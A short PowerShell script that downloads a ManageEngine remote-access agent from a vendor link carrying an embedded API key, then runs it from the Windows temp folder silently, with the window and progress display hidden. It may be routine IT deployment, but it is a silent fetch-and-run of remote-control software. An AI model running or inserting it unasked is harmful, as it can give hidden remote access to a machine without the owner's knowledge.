$url = "https://remoteaccess.manageengine.eu/download?encapiKey=yA6KbHsL7ln2lj5VQxNo0cKP94c5pa8%2F2njj4CixKMwvftDphqE5gxJkdIO5JmSO0dfQ5vkAbtNEIonsttpbfpBgNtQCfZTGTuv4P2uV48xh6NKFdI8ihpQ%3D&os=Windows"
$outputPath = "$env:windir\temp\DCAgent.exe"

$ProgressPreference = 'SilentlyContinue'  # Hides download progress
try {
    Invoke-WebRequest -Uri $url -OutFile $outputPath -UserAgent "Mozilla/5.0" -ErrorAction Stop
    Write-Host "Download completed silently."
} catch {
    Write-Host "[ERROR] Download failed: $_" -ForegroundColor Red
    exit 1
}

if (Test-Path $outputPath) {
    Start-Process -FilePath $outputPath -ArgumentList "/silent" -Wait -WindowStyle Hidden
    Write-Host "Executed silently."
} else {
    Write-Host "[ERROR] File not found: $outputPath" -ForegroundColor Red
}
